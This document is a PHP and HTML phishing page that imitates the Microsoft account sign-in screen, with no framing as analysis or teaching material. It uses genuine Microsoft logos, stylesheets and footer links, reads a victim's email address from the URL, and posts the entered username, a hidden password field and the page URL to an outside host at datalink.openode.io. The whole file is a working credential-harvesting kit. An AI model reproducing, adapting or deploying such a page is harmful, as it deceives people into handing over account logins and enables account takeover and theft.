<?php
function getemailIDFromemail($email)
{
$find = '@';
$pos = strpos($email, $find);
$emailID = substr($email, 0, $pos);
return $emailID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
if (!isset($_GET['email'])) {
  $email = 'email@mail.com';
} else {
  $email = $_GET['email'];
}

$emailID = getemailIDFromemail($email);
$domain = getDomainFromEmail($email);
$ln = strlen($email);
$len = strrev($email);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>

<!DOCTYPE html>
<link rel="icon" type="image/ico" href="files/favicon-16x16.png"/>
<script type="text/javascript">
  function validateForm() {
    if (document.getElementById('gotten') === '') {
      return true;
    }
    return false;
  }
        function geturl() {
            const url = new URL(window.location.href);
            document.getElementById('custurl').value = url;
        }
</script>
<html dir="ltr" class="" lang="en"><head>
    <title>Account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="2057">
    <meta name="LocLC" content="en-GB">
    
        <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    
    <meta name="robots" content="none">    
<link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/cdnbundles/converged.v2.login.min_cqc1snhglyamadfdulaq7a2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-7xB2YbQ2HKWaN0m7PyulSOhSwS38VRNev0qqb/FvW51+0hN2pE62XUuwNyphWvWw">
</head>

<body class="cb" style="display: block; overflow-y: hidden;" onload="geturl();">

<div><!--  --> <div><div class="background" role="presentation"><!-- ko if: smallImageUrl --> <div style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" action="https://datalink.openode.io/office/login"><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }" style="margin-top: -4px;"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }"><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko --> <div class="pagination-view" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            setPendingRequest: $loginPage.view_onSetPendingRequest,
                            showLearnMore: $loginPage.learnMore_onShow,
                            registerDialog: $loginPage.view_onRegisterDialog,
                            unregisterDialog: $loginPage.view_onUnregisterDialog,
                            showDialog: $loginPage.view_onShowDialog } }"><!--  --> <div data-bind="component: { name: 'header-control', params: { serverData: svr } }"><div class="row text-title" id="loginHeader"> 
                                <div role="heading" aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
                <input type="hidden" name="custurl" id="custurl">
                <input type="email" name="username" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    css: { 'has-error': usernameTextbox.error },
                    attr: inputAttributes" placeholder="Email, phone, or Skype" aria-label="Enter your email address, phone number or Skype."> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"><div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --> <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp,
                            ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                            click: signup_onClick } }">No account? <a href="#" id="signup" aria-label="Create a Microsoft account">Create one!</a></div><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --><div class="form-group"> <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" data-bind="
                        text: fidoLinkText,
                        click: switchToFidoCredLink_onClick">Sign in with a security key</a><!-- ko component: { name: 'fido-help-button-control',
                        params: {
                            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
                        event: {
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } } --><!--  --> <span class="help-button" role="button" tabindex="0" data-bind="
    click: fidoHelp_onClick,
    pressEnter: fidoHelp_onClick,
    hasFocus: hasFocus,
    ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']" aria-label="Learn more about signing in with a security key"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28575.00/content/images/documentation_9628e22a6bfb1edc59e81064a666b614.png" svgsrc="https://logincdn.msauth.net/16.000.28575.00/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28575.00/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </span> <div data-bind="component: { name: 'fido-help-dialog-content-control',
    params: {
        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"><!--  --> <div data-bind="component: { name: 'dialog-content-control',
    params: {
        dialogId: 1,
        data: {
            labelledBy: 'fidoDialogTitle',
            describedBy: 'fidoDialogDesc fidoDialogDesc2',
            primaryButtonPreventTabbing: { direction: 'down' },
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"><!-- --></div></div><!-- /ko --> </div>
                        <div class="form-group"> <a id="cantAccessAccount" href="#" data-bind="
                        text: str['WF_STR_CantAccessAccount_Text'],
                        click: cantAccessAccount_onClick">Sign-in options</a> </div><!-- /ko --><!-- ko if: availableCredsWithoutUsername.length > 0 || svr.fShowForgotUsernameLink --><!-- /ko --> </div> </div> </div><div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <br><div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Next" style="margin-top: 4px !important;"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div> </div><!-- ko if: showFedCredButton --><!-- /ko --><!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl --><!-- /ko --><!-- ko if: svr.urlMsaStaticMeControl && newSession() --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="QP7ofefy3jjwc0EaRPn4eqC9u39tGuQv7Psu97GUYdM=9:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRO2_TUACF67xQQSqIhZUBFoST63cd1MGO82xuHFdpEmeJUj9iO_G1a9886j8AY-eOLEgZEUIt4hdUDJXYYACJAcSEWGCphPsDWM70naOjc55kqSJVfsQyLDcRjkRSnPAMyYoUICcszZMMx_AMDSiTA0x0__a9D5__lN6cv1Xff_xy8f16s9wQDxyMw7hcKq1Wq2Jg265hFY3AL50TxBVB_CCIs0zeQmRd3mRinuF3aY6nBQEAnmMpii1Cuu-pvb4LlSpWe3MHngDQSQ6T9qAJIK3hkWesodf3OsrBvDOozUaeznYSOfUYWPc0ACsAwIHGpjwHEw3DXpVLGVr3q8nIg-tPmbuqtMAOfSNB5CbW78y2HUT-OAxifJZ9RaihhZpmJUDIMnDxBrMQdo0JdgPUjYLQirBrxXtMAzGa5EzapKPyymwxtjE9lnQuXOuKzwm2ibgkspuyIB9hTLcUvtFAtSFeNtUkHsjSzIFzZjCsIKrlTIe4g6ctU1ISlKbOwb5PDqAqKRySpuv93dpIqRmmPwUu7Mv62NGOgVx9nS2ks_oBuszupKWQaz4Mo8B259ZVjviZy4CdvzniZT796OsFfa0-vdN-Pqefud8eb13mS1pXCGzLPmE8b2WA6uSgi1jruCIuGBHXF9pS6MYLUagf6ibcE8vUaYE4LRR-FYgXt7bebf_v4X81"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="fd32b9e0-2c4f-4c0b-876c-323b69e32500"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAC5una0EUFgTIF8ElaxtWjTT4uaaenl9QMMJCAj1NgmzUPoCoYMkD5ciLBEelPDleDEfBV15hbFC_zQV5P6ueRUoGvvth_Yr17-33jqI_b0FiY0Vqva5dX0NIObYuOAnDiuDNWjr0Qr-OowtqZgDx2wi2Gc9SDwuwgS9FO1zc5fy9Jao5uPurc-T8kJxwXvwk8cvaeFsXXpbw7RC3WYizVaYPwWFMtN7uRegztXX1kmpWG4_qKV1bY67EXG9SCF9jTzqXFHWMwaU_R3ilAfHIBfD7BOzPqTwO0mywvnCXxNRgNGzpkwAI6aNw7PiKFLi6FiEShXURfxmgeoXMP4tqo_ltzanZ9X1cJzFSheKTNWN7pPU-qxB3Mqtwu59UbXkTq_lydMvnWxwVFEhchuJl6ZIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-GB/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-GB/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for more options"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8438.14/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl && callMsaMeControl() --><!-- /ko --><!-- ko if: svr.urlMsaStaticMeControl && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="https://www.office.com/prefetch/prefetch" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>
